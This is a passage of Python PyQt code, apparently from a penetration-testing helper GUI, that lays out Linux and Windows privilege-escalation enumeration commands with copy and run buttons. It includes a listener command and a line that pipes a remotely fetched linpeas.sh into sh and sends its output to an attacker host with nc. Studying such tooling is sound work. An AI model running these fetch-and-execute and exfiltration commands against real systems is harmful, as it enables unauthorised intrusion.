        command10 = self.lpe_cron_Scan3.text() + "; bash"
        self.lpe_cron_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_cron_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_cron_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_cron_Scan3_Copy)
        label_layout.addWidget(self.lpe_cron_Scan3_Run)
        label_layout.addWidget(self.lpe_cron_Scan3)
        self.tab3_container_layout.insertLayout(166, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_cron_divider 1
        if hasattr(self, 'lpe_cron_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_divider1)
            self.lpe_cron_divider1.deleteLater()
        self.lpe_cron_divider1 = QFrame()
        self.lpe_cron_divider1.setFrameShape(QFrame.HLine)
        self.lpe_cron_divider1.setLineWidth(3)
        self.lpe_cron_divider1.setStyleSheet("color: #20C20E;")

        # lpe_cron_divider2
        if hasattr(self, 'lpe_cron_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_divider2)
            self.lpe_cron_divider2.deleteLater()
        self.lpe_cron_divider2 = QFrame()
        self.lpe_cron_divider2.setFrameShape(QFrame.HLine)
        self.lpe_cron_divider2.setLineWidth(3)
        self.lpe_cron_divider2.setStyleSheet("color: #20C20E;")

        # lpe_cron_spacer1
        if hasattr(self, 'lpe_cron_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_spacer1)
            self.lpe_cron_spacer1.deleteLater()
        self.lpe_cron_spacer1 = QLabel()
        self.lpe_cron_spacer1.setFixedWidth(40)
        self.lpe_cron_spacer1.setFixedHeight(50)

        # lpe_cron_spacer2
        if hasattr(self, 'lpe_cron_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_spacer2)
            self.lpe_cron_spacer2.deleteLater()
        self.lpe_cron_spacer2 = QLabel()
        self.lpe_cron_spacer2.setFixedWidth(40)
        self.lpe_cron_spacer2.setFixedHeight(50)

        # lpe_cron_spacer & divider layout
        self.tab3_container_layout.insertWidget(167, self.lpe_cron_spacer1)
        self.tab3_container_layout.insertWidget(168, self.lpe_cron_divider1)
        self.tab3_container_layout.insertWidget(169, self.lpe_cron_divider2)
        self.tab3_container_layout.insertWidget(170, self.lpe_cron_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_userfiles
        if hasattr(self, 'lpe_userfiles'):
            self.tab3_container_layout.removeWidget(self.lpe_userfiles)
            self.lpe_userfiles.deleteLater()
        self.lpe_userfiles = QLabel("[+ Find all files created by a user]")
        self.lpe_userfiles.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(171,self.lpe_userfiles)

        # lpe_userfiles_Scan1
        if hasattr(self, 'lpe_userfiles_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_userfiles_Scan1)
            self.lpe_userfiles_Scan1.deleteLater()
        self.lpe_userfiles_Scan1 = QLabel("find / -user <user> 2>/dev/null")
        self.lpe_userfiles_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_userfiles_Scan1 copy button
        if hasattr(self, 'lpe_userfiles_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_userfiles_Scan1_Copy)
            self.lpe_userfiles_Scan1_Copy.deleteLater()
        self.lpe_userfiles_Scan1_Copy = QPushButton()
        self.lpe_userfiles_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_userfiles_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_userfiles_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_userfiles_Scan1.text()))
        self.lpe_userfiles_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_userfiles_Scan1 run button
        if hasattr(self, 'lpe_userfiles_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_userfiles_Scan1_Run)
            self.lpe_userfiles_Scan1_Run.deleteLater()
        self.lpe_userfiles_Scan1_Run = QPushButton()
        self.lpe_userfiles_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_userfiles_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_userfiles_Scan1.text() + "; bash"
        self.lpe_userfiles_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_userfiles_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_userfiles_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_userfiles_Scan1_Copy)
        label_layout.addWidget(self.lpe_userfiles_Scan1_Run)
        label_layout.addWidget(self.lpe_userfiles_Scan1)
        self.tab3_container_layout.insertLayout(172, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_userFiles_divider 1
        if hasattr(self, 'lpe_userFiles_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_userFiles_divider1)
            self.lpe_userFiles_divider1.deleteLater()
        self.lpe_userFiles_divider1 = QFrame()
        self.lpe_userFiles_divider1.setFrameShape(QFrame.HLine)
        self.lpe_userFiles_divider1.setLineWidth(3)
        self.lpe_userFiles_divider1.setStyleSheet("color: #20C20E;")

        # lpe_userFiles_divider2
        if hasattr(self, 'lpe_userFiles_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_userFiles_divider2)
            self.lpe_userFiles_divider2.deleteLater()
        self.lpe_userFiles_divider2 = QFrame()
        self.lpe_userFiles_divider2.setFrameShape(QFrame.HLine)
        self.lpe_userFiles_divider2.setLineWidth(3)
        self.lpe_userFiles_divider2.setStyleSheet("color: #20C20E;")

        # lpe_userFiles_spacer1
        if hasattr(self, 'lpe_userFiles_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_userFiles_spacer1)
            self.lpe_userFiles_spacer1.deleteLater()
        self.lpe_userFiles_spacer1 = QLabel()
        self.lpe_userFiles_spacer1.setFixedWidth(40)
        self.lpe_userFiles_spacer1.setFixedHeight(50)

        # lpe_userFiles_spacer2
        if hasattr(self, 'lpe_userFiles_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_userFiles_spacer2)
            self.lpe_userFiles_spacer2.deleteLater()
        self.lpe_userFiles_spacer2 = QLabel()
        self.lpe_userFiles_spacer2.setFixedWidth(40)
        self.lpe_userFiles_spacer2.setFixedHeight(50)

        # lpe_userFiles_spacer & divider layout
        self.tab3_container_layout.insertWidget(173, self.lpe_userFiles_spacer1)
        self.tab3_container_layout.insertWidget(174, self.lpe_userFiles_divider1)
        self.tab3_container_layout.insertWidget(175, self.lpe_userFiles_divider2)
        self.tab3_container_layout.insertWidget(176, self.lpe_userFiles_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_mail
        if hasattr(self, 'lpe_mail'):
            self.tab3_container_layout.removeWidget(self.lpe_mail)
            self.lpe_mail.deleteLater()
        self.lpe_mail = QLabel("[+ Got Mail?]")
        self.lpe_mail.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(177,self.lpe_mail)

        # lpe_mail_Scan1
        if hasattr(self, 'lpe_mail_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_mail_Scan1)
            self.lpe_mail_Scan1.deleteLater()
        self.lpe_mail_Scan1 = QLabel("ls -lsaht /var/mail")
        self.lpe_mail_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_mail_Scan1 copy button
        if hasattr(self, 'lpe_mail_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_mail_Scan1_Copy)
            self.lpe_mail_Scan1_Copy.deleteLater()
        self.lpe_mail_Scan1_Copy = QPushButton()
        self.lpe_mail_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_mail_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_mail_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_mail_Scan1.text()))
        self.lpe_mail_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_mail_Scan1 run button
        if hasattr(self, 'lpe_mail_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_mail_Scan1_Run)
            self.lpe_mail_Scan1_Run.deleteLater()
        self.lpe_mail_Scan1_Run = QPushButton()
        self.lpe_mail_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_mail_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_mail_Scan1.text() + "; bash"
        self.lpe_mail_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_mail_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_mail_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_mail_Scan1_Copy)
        label_layout.addWidget(self.lpe_mail_Scan1_Run)
        label_layout.addWidget(self.lpe_mail_Scan1)
        self.tab3_container_layout.insertLayout(178, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_mail_divider 1
        if hasattr(self, 'lpe_mail_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_mail_divider1)
            self.lpe_mail_divider1.deleteLater()
        self.lpe_mail_divider1 = QFrame()
        self.lpe_mail_divider1.setFrameShape(QFrame.HLine)
        self.lpe_mail_divider1.setLineWidth(3)
        self.lpe_mail_divider1.setStyleSheet("color: #20C20E;")

        # lpe_mail_divider2
        if hasattr(self, 'lpe_mail_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_mail_divider2)
            self.lpe_mail_divider2.deleteLater()
        self.lpe_mail_divider2 = QFrame()
        self.lpe_mail_divider2.setFrameShape(QFrame.HLine)
        self.lpe_mail_divider2.setLineWidth(3)
        self.lpe_mail_divider2.setStyleSheet("color: #20C20E;")

        # lpe_mail_spacer1
        if hasattr(self, 'lpe_mail_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_mail_spacer1)
            self.lpe_mail_spacer1.deleteLater()
        self.lpe_mail_spacer1 = QLabel()
        self.lpe_mail_spacer1.setFixedWidth(40)
        self.lpe_mail_spacer1.setFixedHeight(50)

        # lpe_mail_spacer2
        if hasattr(self, 'lpe_mail_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_mail_spacer2)
            self.lpe_mail_spacer2.deleteLater()
        self.lpe_mail_spacer2 = QLabel()
        self.lpe_mail_spacer2.setFixedWidth(40)
        self.lpe_mail_spacer2.setFixedHeight(50)

        # lpe_mail_spacer & divider layout
        self.tab3_container_layout.insertWidget(179, self.lpe_mail_spacer1)
        self.tab3_container_layout.insertWidget(180, self.lpe_mail_divider1)
        self.tab3_container_layout.insertWidget(181, self.lpe_mail_divider2)
        self.tab3_container_layout.insertWidget(182, self.lpe_mail_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_linpeas
        if hasattr(self, 'lpe_linpeas'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas)
            self.lpe_linpeas.deleteLater()
        self.lpe_linpeas = QLabel("[+ Linpeas From Memory]")
        self.lpe_linpeas.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(183,self.lpe_linpeas)

        # lpe_linpeas_Scan1
        if hasattr(self, 'lpe_linpeas_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_Scan1)
            self.lpe_linpeas_Scan1.deleteLater()
        self.lpe_linpeas_Scan1 = QLabel("nc -nlvp " + self.lport + " | tee linpeas.out")
        self.lpe_linpeas_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_linpeas_Scan1 copy button
        if hasattr(self, 'lpe_linpeas_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_Scan1_Copy)
            self.lpe_linpeas_Scan1_Copy.deleteLater()
        self.lpe_linpeas_Scan1_Copy = QPushButton()
        self.lpe_linpeas_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_linpeas_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_linpeas_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_linpeas_Scan1.text()))
        self.lpe_linpeas_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_linpeas_Scan1 run button
        if hasattr(self, 'lpe_linpeas_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_Scan1_Run)
            self.lpe_linpeas_Scan1_Run.deleteLater()
        self.lpe_linpeas_Scan1_Run = QPushButton()
        self.lpe_linpeas_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_linpeas_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_linpeas_Scan1.text() + "; bash"
        self.lpe_linpeas_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_linpeas_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_linpeas_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_linpeas_Scan1_Copy)
        label_layout.addWidget(self.lpe_linpeas_Scan1_Run)
        label_layout.addWidget(self.lpe_linpeas_Scan1)
        self.tab3_container_layout.insertLayout(184, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_linpeas_Scan2
        if hasattr(self, 'lpe_linpeas_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_Scan2)
            self.lpe_linpeas_Scan2.deleteLater()
        self.lpe_linpeas_Scan2 = QLabel("curl " + self.lhost + "/linpeas.sh | sh | nc " + self.lhost + " " + self.lport)
        self.lpe_linpeas_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_linpeas_Scan2 copy button
        if hasattr(self, 'lpe_linpeas_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_Scan2_Copy)
            self.lpe_linpeas_Scan2_Copy.deleteLater()
        self.lpe_linpeas_Scan2_Copy = QPushButton()
        self.lpe_linpeas_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_linpeas_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_linpeas_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_linpeas_Scan1.text()))
        self.lpe_linpeas_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_linpeas_Scan2 run button
        if hasattr(self, 'lpe_linpeas_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_Scan2_Run)
            self.lpe_linpeas_Scan2_Run.deleteLater()
        self.lpe_linpeas_Scan2_Run = QPushButton()
        self.lpe_linpeas_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_linpeas_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_linpeas_Scan2.text() + "; bash"
        self.lpe_linpeas_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_linpeas_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_linpeas_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_linpeas_Scan2_Copy)
        label_layout.addWidget(self.lpe_linpeas_Scan2_Run)
        label_layout.addWidget(self.lpe_linpeas_Scan2)
        self.tab3_container_layout.insertLayout(185, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_linpeas_divider 1
        if hasattr(self, 'lpe_linpeas_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_divider1)
            self.lpe_linpeas_divider1.deleteLater()
        self.lpe_linpeas_divider1 = QFrame()
        self.lpe_linpeas_divider1.setFrameShape(QFrame.HLine)
        self.lpe_linpeas_divider1.setLineWidth(3)
        self.lpe_linpeas_divider1.setStyleSheet("color: #20C20E;")

        # lpe_linpeas_divider2
        if hasattr(self, 'lpe_linpeas_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_divider2)
            self.lpe_linpeas_divider2.deleteLater()
        self.lpe_linpeas_divider2 = QFrame()
        self.lpe_linpeas_divider2.setFrameShape(QFrame.HLine)
        self.lpe_linpeas_divider2.setLineWidth(3)
        self.lpe_linpeas_divider2.setStyleSheet("color: #20C20E;")

        # lpe_linpeas_spacer1
        if hasattr(self, 'lpe_linpeas_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_spacer1)
            self.lpe_linpeas_spacer1.deleteLater()
        self.lpe_linpeas_spacer1 = QLabel()
        self.lpe_linpeas_spacer1.setFixedWidth(40)
        self.lpe_linpeas_spacer1.setFixedHeight(50)

        # lpe_linpeas_spacer2
        if hasattr(self, 'lpe_linpeas_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_linpeas_spacer2)
            self.lpe_linpeas_spacer2.deleteLater()
        self.lpe_linpeas_spacer2 = QLabel()
        self.lpe_linpeas_spacer2.setFixedWidth(40)
        self.lpe_linpeas_spacer2.setFixedHeight(50)

        # lpe_linpeas_spacer & divider layout
        self.tab3_container_layout.insertWidget(186, self.lpe_linpeas_spacer1)
        self.tab3_container_layout.insertWidget(187, self.lpe_linpeas_divider1)
        self.tab3_container_layout.insertWidget(188, self.lpe_linpeas_divider2)
        self.tab3_container_layout.insertWidget(189, self.lpe_linpeas_spacer2)
        self.tab3_container_layout.addStretch()

    #### WPE
    def wpe(self):
        if not hasattr(self, 'tab4_container'):
            self.tab4_container = QWidget()
            self.tab4_container_layout = QVBoxLayout(self.tab4_container)
            self.tab4_container.setLayout(self.tab4_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab4_container)
            self.scroll.setWidgetResizable(True)
            self.tab4_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab4_container_layout.setContentsMargins(0,0,0,0)
            self.tab4_container.adjustSize()
            
            self.tab4.setLayout(QVBoxLayout())
            self.tab4.layout().addWidget(self.scroll)

    # wpe_top_spacer1
        if hasattr(self, 'wpe_top_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_top_spacer1)
            self.wpe_top_spacer1.deleteLater()
        self.wpe_top_spacer1 = QLabel()
        self.wpe_top_spacer1.setFixedWidth(40)
        self.wpe_top_spacer1.setFixedHeight(50)
     
        # wpe_top_spacer_layout
        self.tab4_container_layout.insertWidget(0, self.wpe_top_spacer1)
        self.tab4_container_layout.addStretch()

    # wpe_0
        if hasattr(self, 'wpe_0'):
            self.tab4_container_layout.removeWidget(self.wpe_0)
            self.wpe_0.deleteLater()
        self.wpe_0 = QLabel("[ + Who am I ]")
        self.wpe_0.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(1,self.wpe_0)
     
        # wpe_0_Scan1
        if hasattr(self, 'wpe_0_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_0_Scan1)
            self.wpe_0_Scan1.deleteLater()
        self.wpe_0_Scan1 = QLabel("whoami")
        self.wpe_0_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(2,self.wpe_0_Scan1)
     
        # wpe_0_Scan1_Copy
        if hasattr(self, 'wpe_0_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_0_Scan1_Copy)
            self.wpe_0_Scan1_Copy.deleteLater()
        self.wpe_0_Scan1_Copy = QPushButton()
        self.wpe_0_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_0_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_0_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_0_Scan1.text()))
        self.wpe_0_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
       
        # wpe_0_Scan1_Help
        if hasattr(self, 'wpe_0_Scan1_Help'):
            self.tab4_container_layout.removeWidget(self.wpe_0_Scan1_Help)
            self.wpe_0_Scan1_Help.deleteLater()
        self.wpe_0_Scan1_Help = QPushButton()
        self.wpe_0_Scan1_Help.setIcon(QIcon("/opt/H4D2/Icons/tooltip.png"))
        self.wpe_0_Scan1_Help.setFixedSize(QSize(20,20))
        self.wpe_0_Scan1_Help.clicked.connect(self.wpe_0_Scan1_Help_Text)
        self.wpe_0_Scan1_Help.clicked.connect(self.show_help_window)
        self.wpe_0_Scan1_Help.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
        
        # wpe_0_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_0_Scan1_Copy)
        label_layout.addWidget(self.wpe_0_Scan1_Help)
        label_layout.addWidget(self.wpe_0_Scan1)
        self.tab4_container_layout.insertLayout(3, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_0_divider1
        if hasattr(self, 'wpe_0_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_0_divider1)
            self.wpe_0_divider1.deleteLater()
        self.wpe_0_divider1 = QFrame()
        self.wpe_0_divider1.setFrameShape(QFrame.HLine)
        self.wpe_0_divider1.setLineWidth(3)
        self.wpe_0_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_0_divider2
        if hasattr(self, 'wpe_0_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_0_divider2)
            self.wpe_0_divider2.deleteLater()
        self.wpe_0_divider2 = QFrame()
        self.wpe_0_divider2.setFrameShape(QFrame.HLine)
        self.wpe_0_divider2.setLineWidth(3)
        self.wpe_0_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_0_spacer1
        if hasattr(self, 'wpe_0_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_0_spacer1)
            self.wpe_0_spacer1.deleteLater()
        self.wpe_0_spacer1 = QLabel()
        self.wpe_0_spacer1.setFixedWidth(40)
        self.wpe_0_spacer1.setFixedHeight(50)
     
        # wpe_0_spacer2
        if hasattr(self, 'wpe_0_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_0_spacer2)
            self.wpe_0_spacer2.deleteLater()
        self.wpe_0_spacer2 = QLabel()
        self.wpe_0_spacer2.setFixedWidth(40)
        self.wpe_0_spacer2.setFixedHeight(50)
     
        # wpe_0 spacer & divider layout
        self.tab4_container_layout.insertWidget(4, self.wpe_0_spacer1)
        self.tab4_container_layout.insertWidget(5, self.wpe_0_divider1)
        self.tab4_container_layout.insertWidget(6, self.wpe_0_divider2)
        self.tab4_container_layout.insertWidget(7, self.wpe_0_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_0_Scan2
        if hasattr(self, 'wpe_0_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_0_Scan2)
            self.wpe_0_Scan2.deleteLater()
        self.wpe_0_Scan2 = QLabel("echo %username%")
        self.wpe_0_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(8,self.wpe_0_Scan2)
     
        # wpe_0_Scan2_Copy
        if hasattr(self, 'wpe_0_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_0_Scan2_Copy)
            self.wpe_0_Scan2_Copy.deleteLater()
        self.wpe_0_Scan2_Copy = QPushButton()
        self.wpe_0_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_0_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_0_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_0_Scan2.text()))
        self.wpe_0_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
        
        # wpe_0_Scan2_Help
        if hasattr(self, 'wpe_0_Scan2_Help'):
            self.tab4_container_layout.removeWidget(self.wpe_0_Scan2_Help)
            self.wpe_0_Scan2_Help.deleteLater()
        self.wpe_0_Scan2_Help = QPushButton()
        self.wpe_0_Scan2_Help.setIcon(QIcon("/opt/H4D2/Icons/tooltip.png"))
        self.wpe_0_Scan2_Help.setFixedSize(QSize(20,20))
        self.wpe_0_Scan2_Help.clicked.connect(self.wpe_0_Scan2_Help_Text)
        self.wpe_0_Scan2_Help.clicked.connect(self.show_help_window)
        self.wpe_0_Scan2_Help.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )

        # wpe_0_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_0_Scan2_Copy)
        label_layout.addWidget(self.wpe_0_Scan2_Help)
        label_layout.addWidget(self.wpe_0_Scan2)
        self.tab4_container_layout.insertLayout(9, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_0_divider1
        if hasattr(self, 'wpe_0_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_0_divider1)
            self.wpe_0_divider1.deleteLater()
        self.wpe_0_divider1 = QFrame()
        self.wpe_0_divider1.setFrameShape(QFrame.HLine)
        self.wpe_0_divider1.setLineWidth(3)
        self.wpe_0_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_0_divider2
        if hasattr(self, 'wpe_0_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_0_divider2)
            self.wpe_0_divider2.deleteLater()
        self.wpe_0_divider2 = QFrame()
        self.wpe_0_divider2.setFrameShape(QFrame.HLine)
        self.wpe_0_divider2.setLineWidth(3)
        self.wpe_0_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_0_spacer1
        if hasattr(self, 'wpe_0_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_0_spacer1)
            self.wpe_0_spacer1.deleteLater()
        self.wpe_0_spacer1 = QLabel()
        self.wpe_0_spacer1.setFixedWidth(40)
        self.wpe_0_spacer1.setFixedHeight(50)
     
        # wpe_0_spacer2
        if hasattr(self, 'wpe_0_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_0_spacer2)
            self.wpe_0_spacer2.deleteLater()
        self.wpe_0_spacer2 = QLabel()
        self.wpe_0_spacer2.setFixedWidth(40)
        self.wpe_0_spacer2.setFixedHeight(50)
     
        # wpe_0 spacer & divider layout
        self.tab4_container_layout.insertWidget(10, self.wpe_0_spacer1)
        self.tab4_container_layout.insertWidget(11, self.wpe_0_divider1)
        self.tab4_container_layout.insertWidget(12, self.wpe_0_divider2)
        self.tab4_container_layout.insertWidget(13, self.wpe_0_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_1
        if hasattr(self, 'wpe_1'):
            self.tab4_container_layout.removeWidget(self.wpe_1)
            self.wpe_1.deleteLater()
        self.wpe_1 = QLabel("[ + Privileges ]")
        self.wpe_1.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(14,self.wpe_1)
     
        # wpe_1_Scan1
        if hasattr(self, 'wpe_1_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_1_Scan1)
            self.wpe_1_Scan1.deleteLater()
        self.wpe_1_Scan1 = QLabel("whoami /priv")
        self.wpe_1_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(15,self.wpe_1_Scan1)
     
        # wpe_1_Scan1_Copy
        if hasattr(self, 'wpe_1_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_1_Scan1_Copy)
            self.wpe_1_Scan1_Copy.deleteLater()
        self.wpe_1_Scan1_Copy = QPushButton()
        self.wpe_1_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_1_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_1_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_1_Scan1.text()))
        self.wpe_1_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_1_Scan1_Help
        if hasattr(self, 'wpe_1_Scan1_Help'):
            self.tab4_container_layout.removeWidget(self.wpe_1_Scan1_Help)
            self.wpe_1_Scan1_Help.deleteLater()
        self.wpe_1_Scan1_Help = QPushButton()
        self.wpe_1_Scan1_Help.setIcon(QIcon("/opt/H4D2/Icons/tooltip.png"))
        self.wpe_1_Scan1_Help.setFixedSize(QSize(20,20))
        self.wpe_1_Scan1_Help.clicked.connect(self.wpe_1_Scan1_Help_Text)
        self.wpe_1_Scan1_Help.clicked.connect(self.show_help_window)
        self.wpe_1_Scan1_Help.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )

        # wpe_1_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_1_Scan1_Copy)
        label_layout.addWidget(self.wpe_1_Scan1_Help)
        label_layout.addWidget(self.wpe_1_Scan1)
        self.tab4_container_layout.insertLayout(16, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_1_divider1
        if hasattr(self, 'wpe_1_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_1_divider1)
            self.wpe_1_divider1.deleteLater()
        self.wpe_1_divider1 = QFrame()
        self.wpe_1_divider1.setFrameShape(QFrame.HLine)
        self.wpe_1_divider1.setLineWidth(3)
